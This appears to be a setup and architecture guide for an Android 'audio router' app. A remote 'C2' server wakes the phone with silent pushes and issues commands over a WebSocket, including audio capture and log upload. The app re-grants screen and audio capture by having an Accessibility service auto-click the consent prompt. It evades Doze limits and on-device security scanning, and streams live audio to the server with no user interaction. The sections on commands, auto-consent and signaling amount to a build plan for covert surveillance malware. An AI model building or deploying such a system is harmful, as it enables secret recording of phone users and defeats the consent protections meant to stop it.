# ADVANCED_FEATURES.md — Advanced Signaling, Telemetry, and Cryptographic Security

## Document Purpose

This document provides a comprehensive, step-by-step technical guide for configuring, deploying, and operating the advanced capabilities of the VyzorixAudioRouter ecosystem. 

These features enable:
1. **Silent Remote Signaling (FCM)**: Wakes up the background process and triggers full-screen permission regrants without root on stock Android 13.
2. **Persistent C2 WebSocket Pipeline**: Sub-20ms, bidirectional full-duplex command execution and high-frequency metric streaming.
3. **Sealed Database Encryption (SQLCipher & Keystore)**: Transparent AES-256 database protection locked via hardware-backed Android Keystore keys.

---

# 1. Advanced Architecture Specifications

```text
  ┌────────────────────────────────────────────────────────────────────────────────────────┐
  │                               RENDER CONTROL SERVER (Node.js/TS)                       │
  │  ┌──────────────────────┐    ┌──────────────────────┐    ┌──────────────────────────┐  │
  │  │  Firebase Admin SDK  │    │   WebSocket Broker   │    │  React Telemetry UI     │  │
  │  └──────────┬───────────┘    └──────────▲───────────┘    └────────────▲─────────────┘  │
  └─────────────┼──────────────────────────┼──────────────────────────────┼────────────────┘
                │ High-Priority            │ Bidirectional                │ WebSocket
                │ Silent Push (Wake)       │ TCP Pipe (C2)                │ Live Stream
                ▼                          ▼                              ▼
  ┌────────────────────────────────────────────────────────────────────────────────────────┐
  │                                 VYZORIX CLIENT DAEMON                                  │
  │  ┌──────────────────────┐    ┌──────────────────────┐    ┌──────────────────────────┐  │
  │  │  FcmWakeLockHolder   │    │ WebSocketClientMgr   │    │  SupportSupportHelper    │  │
  │  │                      │    │                      │    │                          │  │
  │  │  - Holds 10s CPU lock│    │  - Exponential Jitter│    │  - Binds SQLCipher to    │  │
  │  │  - Launches BAL-expt │    │  - Socket Heartbeats │    │    the Room DB instance  │  │
  │  └──────────┬───────────┘    └──────────┬───────────┘    └────────────▲─────────────┘  │
  │             │                           │                             │                │
  │             ▼                           ▼                             │ Binds AES-256  │
  │     FcmCommandParser  ─────────► RemoteCommandExecutor                │ passphrase     │
  │                                         │                             │                │
  │                                         ▼                             │                │
  │                                 AudioManager / Pipeline ──────► KeystoreManager        │
  │                                 (Forces Speaker Reroutes)     (Sealed AES key in SoC)  │
  │                                                                                        │
  └────────────────────────────────────────────────────────────────────────────────────────┘
```

---

# 2. Step-by-Step Manual Configuration Requirements

## 2.1 Firebase Console Configuration (Push Signaling Setup)

Google Play Services manages the persistent, battery-optimized push socket on stock Android Go devices. To configure your client application and server:

### Step 1: Create the Firebase Project
1. Navigate to the [Firebase Console](https://console.firebase.google.com/) and click **Create a project**.
2. Name the project `VyzorixAudioRouter` (or your preferred alias) and complete the registration steps.

### Step 2: Register your Android Client App
1. Inside your Firebase project dashboard, click the **Android Icon** to add an app.
2. Enter the exact Android package name: `com.vyzorix.audiorouter`
3. Click **Register App** and download the generated configuration file: `google-services.json`.
4. Place this file directly inside the Android project root of the app module at `/app/google-services.json`.

### Step 3: Generate the Server Private Certificate
1. Go to **Project Settings** (gear icon) -> **Service Accounts**.
2. Under the *Firebase Admin SDK* section, select **Node.js** and click **Generate new private key**.
3. Confirm by clicking **Generate Key**. This downloads a private `.json` certificate file containing your server credentials (e.g., `vyzorix-service-account.json`). Store this securely.

---

## 2.2 Render Dashboard Setup (Backend Server Deployment)

Your Node.js/TypeScript C2 update server must run inside an environment with access to Firebase Admin credentials and dynamic port bindings:

### Step 1: Deploy the Server to Render
1. Connect your Github repository containing the `vyzorix-update-server/` module to your [Render Dashboard](https://dashboard.render.com/).
2. Select **Create Web Service**. Name the service `vyzorix-update-server`.
3. Set the environment type to **Docker** (it will automatically build using the multi-stage `Dockerfile`).

### Step 2: Add Environment Variables
Navigate to your Web Service **Environment** settings page on Render and add the following keys:

| Key | Value | Purpose |
|-----|-------|---------|
| `NODE_ENV` | `production` | Enforces Express caching and optimal memory profiles. |
| `PORT` | `3000` | Specifies the active server socket port. |
| `FIREBASE_CREDENTIALS` | *(Paste raw string contents of your `vyzorix-service-account.json`)* | Grants the server permission to compile and push silent commands. |

---

## 2.3 Android Client Endpoint Configurations

To direct Vyzorix to communicate directly with your newly deployed Render server, configure the client-side addresses:

### Step 1: Trust your Render Domain
Open `app/src/main/res/xml/network_security_config.xml` and insert your Render domain (cleartext is blocked except for localhost to satisfy Android 13 rules):

```xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <domain-config cleartextTrafficPermitted="false">
        <domain includeSubdomains="true">vyzorix-update-server.onrender.com</domain>
    </domain-config>
</network-security-config>
```

### Step 2: Set the Production Endpoints
Open `core/common/src/main/kotlin/com/vyzorix/audiorouter/common/constants/UpdateApiConstants.kt` and configure your production target addresses:

```kotlin
package com.vyzorix.audiorouter.common.constants

object UpdateApiConstants {
    const val BASE_URL = "https://vyzorix-update-server.onrender.com/api/v1/"
    const val DOWNLOAD_URL_TEMPL = "https://vyzorix-update-server.onrender.com/bin/"
    const val WEBSOCKET_C2_URL = "wss://vyzorix-update-server.onrender.com/c2"
}
```

---

# 3. Remote Command Interface & Payload Contract

When commands are issued via the React Dashboard, they travel to the Android client as typed JSON packets. The client executes these commands locally, bypassing standard background limitations.

## 3.1 Supported Remote Command Catalog

| Command Action | Parameters | Natively Allowed on Stock OS? | Non-Root Bypass Implementation Strategy |
|----------------|------------|-------------------------------|-----------------------------------------|
| `FORCE_SPEAKER` | None | **Yes** | Programmatically sets global mode to `MODE_IN_COMMUNICATION` and forces `isSpeakerphoneOn = true`. Runs on a 500ms reassertion thread loop to defeat OS drift. |
| `RESET_AUDIO_HAL` | None | **No** (Direct Shell Blocked) | Executed as a "Soft HAL reset" by programmatically cycling BT streams and issuing a sub-audible micro-burst under `USAGE_VOICE_COMMUNICATION` to force HAL re-probing. |
| `TOGGLE_CAPTURE` | `active` (boolean) | **Yes** | Starts or stops the `AudioRecord` read loops on the active MediaProjection thread pool. |
| `REINIT_PROJECTION` | None | **No** (Background activity blocked) | Launches `ProjectionPermissionActivity` legally via a High-Priority `fullScreenIntent` Notification heads-up overlay, immediately automated by the Accessibility engine. |
| `DUMP_FLIGHT_DATA` | None | **Yes** | Gathers local metrics, parses them to JSON, and postbacks the telemetry payload immediately. |
| `UPLOAD_CRASH_ZIP` | None | **Yes** | Invokes `CrashSnapshotExporter` to zip the offline SQLite logs and securely POSTs the resulting binary block. |
| `SET_LOG_LEVEL` | `level` (string) | **Yes** | Dynamically modifies `Logger.minLogLevel` in memory to increase or decrease tracing verbosity. |
| `WAKE_UP_UPDATER` | None | **Yes** | Overrides WorkManager delays and runs `UpdateChecker` instantly. |

---

## 3.2 WebSocket Command Frame (JSON Contract)

Command frames routed from the server to the device use the following schema:

```json
{
  "transactionId": "f7893a2-bcd0-4e12",
  "deviceId": "uuid-nokia-c22-092831",
  "action": "REINIT_PROJECTION",
  "timestamp": "2026-05-26T12:00:00.000Z",
  "params": {}
}
```

On execution completion, the device dispatches a type-safe feedback packet back to the server:

```json
{
  "transactionId": "f7893a2-bcd0-4e12",
  "deviceId": "uuid-nokia-c22-092831",
  "action": "REINIT_PROJECTION",
  "success": true,
  "timestamp": "2026-05-26T12:00:00.080Z",
  "payload": {
    "tokenState": "ACTIVE",
    "bufferLevel": "98%"
  }
}
```

---

# 4. Storage Encryption & Cryptographic Pipeline

Pre-installed security layers on the Nokia C22 actively scan local storage directories. To prevent unauthorized retrieval of diagnostic logs, state flags, or payment timelines, Vyzorix encrypts database tables transparently.

```text
  ┌──────────────────────┐
  │   Android Keystore   │  <-- Cryptographically sealed inside hardware Secure Element (SoC)
  └──────────┬───────────┘
             │ getOrGenerateDatabaseKey()
             ▼
  ┌──────────────────────┐
  │   SupportFactory     │  <-- Dynamically unlocks SQLCipher database using PBKDF2 hash
  └──────────┬───────────┘
             │ Binds factory
             ▼
  ┌──────────────────────┐
  │     Room DB (Open)   │  <-- Unencrypted SQL queries mapped safely in local volatile memory
  └──────────────────────┘
```

## 4.1 SQLCipher Integration details
Rather than relying on basic file-system encryption, Vyzorix uses **SQLCipher** (a 256-bit AES transparent SQLite cryptor).
1. When `VyzorixAppInitializer` starts, it requests the cryptographic database passcode from `KeystoreManager.kt`.
2. `KeystoreManager` talks directly to Android’s Keystore system daemon, which manages symmetric keys sealed within the hardware Secure Element (SoC/TEE).
3. The derived AES key is passed as a support helper factory argument directly into Room's builder:
   ```kotlin
   val databasePasscode = KeystoreManager.getDatabaseKey()
   val factory = SupportFactory(SQLiteDatabase.getBytes(databasePasscode))
   
   val db = Room.databaseBuilder(context, DaemonDatabase::class.java, "vyzorix_secure.db")
       .openHelperFactory(factory)
       .build()
   ```
4. This ensures that every single block written to the physical database file is encrypted with AES-256 before writing to disk, protecting the local diagnostic histories against physical dumping.

---

# 5. Remote Automation and Signaling Lifecycles

## 5.1 Silent Wake-Up and Activity Re-Grant Lifecycle

On stock Android 13, background services are frequently put to sleep or revoked of resources. When the server needs to issue an over-the-air audio route check on a sleeping phone, it executes the following signaling sequence:

```text
 Render Control Server                  Google FCM Cloud Gateway                  Nokia C22 Device (Sleeping)
        │                                        │                                           │
        │ 1. POST /sendPush                      │                                           │
        ├───────────────────────────────────────►│                                           │
        │    - High-Priority                     │                                           │
        │    - Silent silent payload             │                                           │
        │                                        │ 2. Delivers silent push                   │
        │                                        ├──────────────────────────────────────────►│
        │                                        │                                           │
        │                                        │                                           │ 3. VyzorixMessagingService
        │                                        │                                           │    receives push intent
        │                                        │                                           │
        │                                        │                                           │ 4. FcmWakeLockHolder grabs
        │                                        │                                           │    10-second CPU lock
        │                                        │                                           │
        │                                        │                                           │ 5. FcmCommandParser parses
        │                                        │                                           │    and decrypts package
        │                                        │                                           │
        │                                        │                                           │ 6. If re-grant needed,
        │                                        │                                           │    posts FullScreenIntent
        │                                        │                                           │    heads-up notification
        │                                        │                                           │
        │                                        │                                           │ 7. Trampoline UI launches;
        │                                        │                                           │    Automation Daemon clicks
        │                                        │                                           │    "Start Now" (<100ms)
        │                                        │                                           │
        │ 8. Connects WebSocket channel          │                                           │ 8. Connects WebSocket
        │◄───────────────────────────────────────┼───────────────────────────────────────────┤
        │                                        │                                           │
        │ 9. Streams live audio/telemetry        │                                           │ 9. Streams live telemetry
        │◄───────────────────────────────────────┼───────────────────────────────────────────┤
        │                                        │                                           │
```

This multi-tiered signaling approach bypasses Doze Mode and background activity restrictions on stock Android 13 Go Edition, giving your server full real-time operational persistence with zero user-interaction required.
